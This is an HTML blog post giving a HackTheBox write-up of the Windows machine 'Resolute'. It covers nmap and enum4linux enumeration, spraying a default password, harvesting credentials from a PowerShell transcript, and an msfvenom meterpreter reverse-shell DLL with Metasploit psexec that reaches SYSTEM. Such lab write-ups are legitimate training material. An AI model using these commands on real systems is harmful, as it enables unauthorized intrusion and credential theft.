@@ -1,0 +1,218 @@
+<!DOCTYPE HTML>
+<!--
+	Massively by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Bastion Write up</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="../..//assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="../../assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="../../index.html" class="logo">Le Baphomet</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="links">
+							<li><a href="../../index.html">Home</a></li>
+							<li class="active"><a href="../nothere.jpg">Hackthebox</a></li>
+							<li><a href="../nothere.jpg">Archive</a></li>
+						</ul>
+						<ul class="icons">
+							<li><a href="https://www.linkedin.com/in/rodhnny/" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+							<li><a href="https://github.com/lebaphomet" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">April 25, 2020</span>
+									<h1>[HackTheBox]<br />
+									htb{Resolute}</h1>
+									<p>A not so old Machine retired just a few days (if you are reading this around 06/02/20).</br>
+										Another Windows OS based machine, Windows machines are my least favorite ones :(</br></p>
+										But here’s my write up for Resolute!</p>
+
+										<p>Please note for the sake of keeping the post short I’ve trimmed a lot of stuff from my original experience with the machine.</p>
+
+
+								</header>
+								<div class="image main"><img src="resolute.jpg" alt="resolute information" /></div>
+
+								Starting off with reaching the box which has IP: 10.10.10.169
+
+<pre><code><b>root@kek:~# ping resolute.htb
+PING resolute.htb (10.10.10.169) 56(84) bytes of data.
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=1 ttl=127 time=97.10 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=2 ttl=127 time=126 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=3 ttl=127 time=115 ms</b></code></pre>
+
+Now off to fire up our nmap scan:
+<pre><code><b>| root@kek:~/htb/resolute# nmap -sV -sC -sC -T4 Resolute.htb 10.10.10.169</code></pre></b>
+
+All them ports:
+<pre><code><b>Nmap scan report for resolute.htb (10.10.10.169)
+Host is up (0.095s latency).
+Not shown: 989 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain?
+| fingerprint-strings:
+| DNSVersionBindReqTCP:
+| version
+|_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped</b></code></pre>
+
+<p>Let’s keep gathering more information, lately on windows boxes I like to run the enum4linux. <br>
+Which is a tool that as it almost says on the name enumerates, this is the linux variant of the .exe tool sort off.. more info <a href="https://tools.kali.org/information-gathering/enum4linux">here.</a></p>
+
+<pre><code><b>root@kek:~/htb/resolute# enum4linux -a resolute.htb
+==========================
+| Target Information |
+==========================
+Target ……….. resolute.htb
+RID Range …….. 500–550,1000–1050
+Username ……… ‘’
+Password ……… ‘’
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</b></code></pre>
+
+<p> It will load a bunch of information but we’ll focus on this part, also a bunch of user we could scrape. A warm welcome :)
+<div class="image main"><img src="resolute2.jpg" alt="users" /></div></p>
+
+<p>So we got this information account marko and descritpion show that the password was set to Welcome123!</br>
+Ssoooo.. what we have so far, bunch of ports and what it seems a user and possible password and possible domain info megabank.local </br></p>
+<p> Let’s use the ol’ windows bestie Evil WinRm with the user and credentials just to find out that it does not work proobs he already changed it. We still have a few users we scraped from the enumeration.</p>
+
+<p>We could either do a bruteforce or try manually one by one hoping the default password or someone has the same one.</br>
+We could also automate this “Bruteforcing”,Anyways after a while we could login as Melanie using password “Welcome123!” CoffcoffTriedalluserswiththispasswordcoffcoff.</br>
+<div class="image main"><img src="resolute3.jpg" alt="evilwinrm" /></div></p>
+
+Now we look here and there and will find the user.txt on the Desktop dir:
+<b><pre><code>*Evil-WinRM* PS C:\Users\melanie\Desktop> dir -force
+Directory: C:\Users\melanie\Desktop
+Mode LastWriteTime Length Name
+— — — — — — — — — — — — — —
+-ar — — 12/3/2019 7:33 AM 32 user.txt
+*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
+0c3be45fc</code></pre></b>
+
+Now onto Root we need to find a way to escalate privileges;</br>
+So more enumeration, let’s check what kind of privs we have:
+
+<div class="image main"><img src="resolute4.jpg" alt="privs" /></div></p>
+
+<p>Alrightys keeping on looking on what we have access.</br>
+Navigating through we’ll see a dir called PSTranscripts which is hidden and inside another dir too.</p>
+<div class="image main"><img src="resolute5.jpg" alt="dirs" /></div></p>
+
+<p>Inside of this hidden path we’ll find a file called “PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt” </br>
+Looking at the inside we’ll see indeed a transcript but this has something interesting in it, let’s look it closely.</br>
+<div class="image main"><img src="resolute6.jpg" alt="password" /></div></p>
+
+<p>Looking closely we’ll find this line:
+<pre><code><b>>> ParameterBinding(Invoke-Expression): name=”Command”; value=”cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</b> </code></pre> </p>
+
+<p>Interesting enough we can see two things what looks like a user and password and the \\fs01\backups dir.</br>
+samee thing let’s give a try to the user and password we just found out.</p>
+
+<b><pre><code>root@kek:~/htb/resolute# evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!</b> </code></pre>
+<div class="image main"><img src="resolute7.jpg" alt="login as ryan" /></div></p>
+
+<p>Sooo we were able to log in as our Ryan boii.</br>
+After a few minutes (coffcoffhourscoffcoff) I was able to find a method to escalate, if we take a look a our guy ryan groups we can see he’s part of MEGABANK\DnsAdmins and looking/googling we can learn that we could jump from DNSadmin to DC admin :P</br></p>
+
+<p>Awesome resources:</br>
+<b><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"> Feature, not bug: DNSAdmin to DC compromise in one line </a></br>
+<a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise"> From DnsAdmins to SYSTEM to Domain Compromise</a></b>
+
+<p>Now, let’s build up the .dll</br></p>
+
+<b><pre><code>root@kek:~/htb/resolute# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f dll > letmein.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes</code></pre></b>
+
+<p>And let’s upload that .dll</br>
+but seems as soon we upload it it will be blown away..</p>
+
+<p>This time I’ll use another method, PSEXEC with mfsconsole (There was another machine this trick helped in getting root easy peasy);</br>
+	So firing up msf we should have something like this:</p>
+	<div class="image main"><img src="resolute8.jpg" alt="msf config" /></div></p>
+
+<b><pre><code>meterpreter > shell
+Process 2116 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+© 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+</b></code></pre>
+
+Welp! We have succesfully pwned the machine at this time, just find the root.txt on the \Users\administrator\desktop\ path.</br>
+
+<pre><code>Directory of C:\Users\Administrator\Desktop
+12/04/2019 06:18 AM DIR .
+12/04/2019 06:18 AM DIR.
+12/03/2019 08:32 AM 32 <b>root.txt</b>
+1 File(s) 32 bytes
+2 Dir(s) 30,969,835,520 bytes free
+| C:\Users\Administrator\Desktop><b>type root.txt
+type root.txt
+e1d94876a506</b></code></pre>
+
+<p>So this time we got another easy root however I am sure there are plenty other ways to root this machine, I faced so many issues with impacket that at the end had to take this PSEXEC route with msfconsole which automates creating payload, loading it up and opening a meterpreter session.</p>
+Once more if you read this, thanks for your time.</br>
+If you have any question or would like to talk anything related HTB feel free to chime in :)</p></br>
+
+<p>Hack the planet and stay safe! x)</p>
+
+<div class="image"><img src="1_8WINeDA9BY08yp2xvoQGIQ.jpg" alt="user" /></div>
+
+</section>
+					</div>
+				<!-- Footer -->
+					<footer id="footer">
+					</footer>
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net">HTML5 UP</a></li></ul>
+					</div>
+			</div>
+
+		<!-- Scripts -->
+			<script src="../../assets/js/jquery.min.js"></script>
+			<script src="../../assets/js/jquery.scrollex.min.js"></script>
+			<script src="../../assets/js/jquery.scrolly.min.js"></script>
+			<script src="../../assets/js/browser.min.js"></script>
+			<script src="../../assets/js/breakpoints.min.js"></script>
+			<script src="../../assets/js/util.js"></script>
+			<script src="../../assets/js/main.js"></script>
+
+	</body>
+</html>
